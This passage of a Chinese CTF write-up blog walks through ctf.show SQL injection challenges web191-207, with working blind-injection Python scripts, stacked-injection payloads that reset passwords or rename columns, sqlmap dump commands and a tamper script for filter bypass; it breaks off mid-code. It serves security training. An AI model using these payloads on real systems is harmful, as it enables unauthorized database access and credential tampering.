url = &quot;http://646c4493-3a66-407e-8ddf-c59355418a23.challenge.ctf.show/api/&quot;

result = &quot;&quot;
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # 查数据库 ctfshow_fl0g
        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        # 查字段 f1ag
        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&quot;
        # 查flag
        payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;
        data = &#123;
            &#39;username&#39;: f&quot;admin&#39; and if(ord(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#39;1&quot;,
            &#39;password&#39;: &#39;1&#39;
        &#125;

        r = requests.post(url,data=data)
        if &quot;密码错误&quot;  == r.json()[&#39;msg&#39;]:
            head = mid + 1
        else:
            # print(r.text)
            tail = mid

    last = result

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


</code></pre>
<p>爆破出来可能是大写的</p>
<p>主要还是一个地方，就是一般布尔注入都会用改成ascii码值进行比较，正常字符串的比较不也是挨个位置比较ascii码吗？为什么还要多费事的去加一层ascii，这个的原因就是mysql进行字符串比较的时候，是按大写比较的，比如”1ab2AAD”，比较的时候是”1AB2AAD”，所以才会加上那一层ascii，这题ascii被ban了，直接字符串比较的话肯定爆出来的都是大写了。</p>
<h1 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h1><h2 id="过滤ord和ascii函数"><a href="#过滤ord和ascii函数" class="headerlink" title="过滤ord和ascii函数"></a>过滤ord和ascii函数</h2><pre><code class="python"> Author:feng
import requests
from time import time

url=&#39;http://00b9416c-a0a8-490b-b48b-b2ace6ec42b2.chall.ctf.show:8080/api/index.php&#39;

flag=&#39;&#39;
for i in range(1,100):
    length=len(flag)
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag.lower())
            if chr(j)==&quot; &quot;:
                exit()
            break

        payload=&quot;&#39; or if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)&lt;&#39;&#123;&#125;&#39;,1,0)-- -&quot;.format(i,chr(j))

        data=&#123;
            &#39;username&#39;:payload,
            &#39;password&#39;:1
        &#125;
        r=requests.post(url=url,data=data).text
        #print(r)
        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in r:
            max=j
        else :
            min=j

</code></pre>
<pre><code class="python"> Author:Y4tacker
import requests
import string

url = &quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;
flagstr=&quot; _&#123;&#125;-&quot; + string.ascii_lowercase + string.digits
flag = &#39;&#39;
for i in range(1,45):
    for j in flagstr:
        payload = f&quot;admin&#39; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1)regexp(&#39;&#123;j&#125;&#39;),1,2)=&#39;1&quot;
        data = &#123;
            &#39;username&#39;: payload,
            &#39;password&#39;: &#39;1&#39;
        &#125;
        r = requests.post(url, data=data)
        if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:
            flag += j
            print(flag)
            if &quot;&#125;&quot; == j:
                exit(0)
            break
</code></pre>
<h1 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h1><h2 id="过滤sustr"><a href="#过滤sustr" class="headerlink" title="过滤sustr"></a>过滤sustr</h2><pre><code class="python"> Author:feng
import requests

url=&#39;http://fc1e9e65-4116-4635-aebc-05e37fef775f.challenge.ctf.show/api/&#39;
flag=&quot;&quot;
for i in range(0,100):
    for j in &quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;:
        #payload=&quot;&#39; or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like &#39;&#123;&#125;&#39;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)
        #payload=&quot;&#39; or if((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flxg&#39;) like &#39;&#123;&#125;&#39;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)
        payload=&quot;&#39; or if((select group_concat(f1ag) from ctfshow_flxg) like &#39;&#123;&#125;&#39;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)

        data=&#123;
            &#39;username&#39;:payload,
            &#39;password&#39;:1
        &#125;
        #print(payload)
        r=requests.post(url=url,data=data)
        #print(payload)
        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in r.text:
            flag+=j
            print(flag)
            if j==&#39;&#125;&#39;:
                exit()
            break
</code></pre>
<pre><code class="python"> Author:Y4tacker
import requests
import string

url = &quot;http://fc1e9e65-4116-4635-aebc-05e37fef775f.challenge.ctf.show/api/&quot;
flagstr=&quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;
flag = &#39;&#39;

for i in range(1,45):
    for j in flagstr:
        payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        # 查字段 f1ag
        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&quot;
        #payload = &quot;(select group_concat(f1ag) from ctfshow_fl0g)&quot;
        payload = f&quot;admin&#39; and if((&#123;payload&#125;)regexp(&#39;&#123;flag +j&#125;&#39;),1,2)=&#39;1&quot;
        print(payload)
        data = &#123;
            &#39;username&#39;: payload,
            &#39;password&#39;: &#39;1&#39;
        &#125;
        r = requests.post(url, data=data)
        if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:
            flag += j
            print(flag)
            if &quot;&#125;&quot; == j:
                exit(0)
            break
</code></pre>
<h1 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h1><h2 id="locat-正则注入"><a href="#locat-正则注入" class="headerlink" title="locat()正则注入"></a>locat()正则注入</h2><pre><code class="python"> Author:Y4tacker
import requests
# 应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE
url = &quot;http://dee436de-268a-408e-b66a-88b4c972e5f5.chall.ctf.show/api/&quot;
final = &quot;&quot;
stttr = &quot;flag&#123;&#125;-_1234567890qwertyuiopsdhjkzxcvbnm&quot;
for i in range(1,45):
    for j in stttr:
        final += j
        # 查表名-ctfshow_flxg
        # payload = f&quot;admin&#39; and if(locate(&#39;&#123;final&#125;&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,1,2)=&#39;1&quot;
        # 查字段-f1ag
        # payload = f&quot;admin&#39; and if(locate(&#39;&#123;final&#125;&#39;,(select column_name from information_schema.columns where table_name=&#39;ctfshow_flxg&#39; limit 1,1))=1,1,2)=&#39;1&quot;
        payload = f&quot;admin&#39; and if(locate(&#39;&#123;final&#125;&#39;,(select f1ag from ctfshow_flxg limit 0,1))=1,1,2)=&#39;1&quot;
        data = &#123;
            &#39;username&#39;: payload,
            &#39;password&#39;: &#39;1&#39;
        &#125;
        r = requests.post(url,data=data)
        if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:
            print(final)
        else:
            final = final[:-1]

</code></pre>
<pre><code class="python">import requests
import string

url = &quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;
flagstr=&quot; _&#123;&#125;-&quot; + string.ascii_lowercase + string.digits
flag = &#39;&#39;
z = &#39;flag&#39;
for i in range(1,45):
    for j in flagstr:
        payload = f&quot;admin&#39; and if((select group_concat(f1ag) from ctfshow_fl0g)regexp(&#39;&#123;j&#125;&#39;),1,2)=&#39;1&quot;
        data = &#123;
            &#39;username&#39;: payload,
            &#39;password&#39;: &#39;1&#39;
        &#125;
        r = requests.post(url, data=data)
        if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:
            flag += j
            print(flag)
            if &quot;&#125;&quot; == j:
                exit(0)
            break
</code></pre>
<h1 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h1><h2 id="update堆叠注入"><a href="#update堆叠注入" class="headerlink" title="update堆叠注入"></a>update堆叠注入</h2><p>把所有的密码都改为111，之后登录就好</p>
<pre><code>0x61646d696e;update`ctfshow_user`set`pass`=0x313131;
# 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围
sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180508467.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407180508467"></p>

<h1 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180601416.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407180601416"></p>

<pre><code>
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#39;, $username))&#123;
    $ret[&#39;msg&#39;]=&#39;用户名非法&#39;;
    die(json_encode($ret));
  &#125;
</code></pre>
<p>可能是过滤错了吧</p>
<pre><code>1;select(1)
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180656002.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407180656002"></p>

<h1 id="web197-198"><a href="#web197-198" class="headerlink" title="web197-198"></a>web197-198</h1><h2 id="alter更改列名堆叠注入"><a href="#alter更改列名堆叠注入" class="headerlink" title="alter更改列名堆叠注入"></a>alter更改列名堆叠注入</h2><p>利用alter更改列名。一开始想着把username更改为pass，然后查出来的就是字符串用户名，和数字0进行弱类型比较就可以了，但是实际尝试发现不行，看了一下发现这题没有检查传入的password是不是数字，而且没有用intval对password进行处理，所以这样不行，那就把id改成pass，然后爆破id就可以了。</p>
<pre><code class="mysql">1;alter table `ctfshow_user` change `pass` `feng` varchar(255); alter table `ctfshow_user` change `id` `pass` varchar(255)
</code></pre>
<pre><code class="python"> Author:Y4tacker
import requests

url = &quot;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/&quot;
for i in range(100):
    if i == 0:
        data = &#123;
            &#39;username&#39;: &#39;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user &#39;
                        &#39;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` &#39;
                        &#39;varchar(255);&#39;,
            &#39;password&#39;: f&#39;&#123;i&#125;&#39;
        &#125;
        r = requests.post(url, data=data)
    data = &#123;
        &#39;username&#39;: &#39;0x61646d696e&#39;,
        &#39;password&#39;: f&#39;&#123;i&#125;&#39;
    &#125;
    r = requests.post(url, data=data)
    if &quot;登陆成功&quot; in r.json()[&#39;msg&#39;]:
        print(r.json()[&#39;msg&#39;])
        break


#登陆成功 flag is ctfshow&#123;1e8cd464-117c-4863-a8ea-0e7b83d3d9fe&#125;
</code></pre>
<h1 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h1><h2 id="堆叠登录"><a href="#堆叠登录" class="headerlink" title="堆叠登录"></a>堆叠登录</h2><pre><code>1;show tables
ctfshow_user
</code></pre>
<p>show tables;会显示表名,也就是ctfshow_user那么这个时候会将查出来的这个值当成密码,也就是密码为ctfshow_user</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407182514272.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407182514272"></p>

<h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><h2 id="改referer"><a href="#改referer" class="headerlink" title="改referer"></a>改referer</h2><pre><code>探测注入点
python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; --batch
数据库
python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; --dbs --batch
表名
python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; --tables --batch
字段名
python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; -T ctfshow_user --columns --batch
数据
python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; -T ctfshow_user -C &quot;pass&quot; --dump --batch
</code></pre>
<h1 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h1><h2 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h2><pre><code>注入点
python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --batch
数据库
python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --dbs --batch
表名
python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web --tables --batch
字段名
python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web -T ctfshow_user --columns --batch
数据
python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch
</code></pre>
<h1 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h1><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>必须要加index.php</p>
<pre><code>注入点
python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --batch
数据库
python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --dbs --batch
表名
python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web --tables --batch
字段名
python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user --columns --batch
数据
python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch
</code></pre>
<h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><h2 id="改cookie"><a href="#改cookie" class="headerlink" title="改cookie"></a>改cookie</h2><pre><code>python sqlmap.py -u http://4d60760f-5063-4ed9-9221-e282903a6cd9.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=eq5fptfudtbh83i0c0cefg944a; ctfshow=0b535f51ad8cd475e68035ffa3f7fdf7&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch
</code></pre>
<h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><h2 id="访问安全链接"><a href="#访问安全链接" class="headerlink" title="访问安全链接"></a>访问安全链接</h2><p>可以发现查询数据时先去访问了getToken.php,接着才是查询数据</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407200618827.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407200618827"></p>

<pre><code>--safe-url 设置在测试目标地址前访问的安全链接
 --safe-freq 设置两次注入测试前访问安全链接的次数
</code></pre>
<pre><code>注入点
python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch
数据库
python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --dbs
表名
python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web --tables
字段名
python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flax --columns
数据
python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flax -C flagx --dump
</code></pre>
<h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><pre><code>注入点
python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch
数据库
python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --dbs
表名
python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web --tables
字段名
python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flaxc --columns
数据
python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flaxc -C flagv --dump
</code></pre>
<h1 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h1><h2 id="sqlmap的tamper编写"><a href="#sqlmap的tamper编写" class="headerlink" title="sqlmap的tamper编写"></a>sqlmap的tamper编写</h2><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>mytamper.py</p>
<pre><code class="python">#!/usr/bin/env python

&quot;&quot;&quot;
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file &#39;doc/COPYING&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW # 当前脚本调用优先等级

def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
    pass

def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
    return payload
</code></pre>
<p>把他保存在sqlmap\tamper路径下,然后使用的时候就加上 –tamper&#x3D;mytamper就好了</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code class="python">#!/usr/bin/env python

&quot;&quot;&quot;
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file &#39;LICENSE&#39; for copying permission
&quot;&quot;&quot;

import random

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def randomIP():
    numbers = []

    while not numbers or numbers[0] in (10, 172, 192):
        numbers = random.sample(xrange(1, 255), 4)

    return &#39;.&#39;.join(str(_) for _ in numbers)

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Append a fake HTTP header &#39;X-Forwarded-For&#39;
    &quot;&quot;&quot;

    headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)
    headers[&quot;X-Forwarded-For&quot;] = randomIP()
    headers[&quot;X-Client-Ip&quot;] = randomIP()
    headers[&quot;X-Real-Ip&quot;] = randomIP()
    return payload
</code></pre>
<p>分别包括import部分 __priority__属性 dependencies函数 tamper函数以及用户自定义的函数</p>
<h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>这一部分我们可以导入sqlmap的内部库,sqlmap为我们提供了很多封装好的函数和数据模型,比如下文的PRORITY就来源于 selmap&#x2F;lib&#x2F;core&#x2F;enums.py</p>
<h3 id="PRIORITY"><a href="#PRIORITY" class="headerlink" title="PRIORITY"></a>PRIORITY</h3><p>PRIORITY是定义tamper的优先级,PRIORITY有以下几个参数</p>
<ul>
<li>LOWEST &#x3D; -100</li>
<li>LOWER &#x3D; -50</li>
<li>LOW &#x3D; -10</li>
<li>NORMAL &#x3D; 0</li>
<li>HIGH &#x3D; 10</li>
<li>HIGHER &#x3D; 50 </li>
<li>HIGHER &#x3D; 50</li>
<li>HIGHEST &#x3D; 100</li>
</ul>
<p>如果使用了多个tamper,sqlmap会根据每一个tamper定义的PRIORITY的参数等级来优先使用等级较高的tamper,如果你有两个tamper需要同时用,需要注意</p>
<h3 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h3><p>dependencies主要是提示用户,增tamper支持哪些数据可以支持哪些数据库</p>
<pre><code class="python">#!/usr/bin/env python

&quot;&quot;&quot;
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file &#39;LICENSE&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS

__priority__ = PRIORITY.NORMAL

def dependencies():
    singleTimeWarnMessage(&quot;这是我的tamper提示&quot;)

def tamper(payload, **kwargs):
    return payload
</code></pre>
<p>DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数也可以看这个\sqlmap\lib\core\enums.py</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203541626.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407203541626"></p>

<h3 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h3><p>tamper这个函数是tamper最重要的函数,你要实现的功能,全部写在这个函数里.payload这个参数就是sqlmap的原始注入payload,我们要实现绕过,一般就是针对这个payload的修改.kwargs是针对http头部的修改,如果你是bypass,是通过修改http头,就需要使用这个</p>
<h3 id="基于payload"><a href="#基于payload" class="headerlink" title="基于payload"></a>基于payload</h3><p>先来基于修改payload来绕过替换关键字，我使用sqlilab的第一关，并且修改了部分代码来把恶意关键字替换为空来避免联合查询，如图</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203858410.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407203858410"></p>

<p>编写tamper来双写绕过</p>
<pre><code class="python">def tamper(payload, **kwargs):
    payload = payload.lower()
    payload = payload.replace(&#39;select&#39;,&#39;seleselectct&#39;)
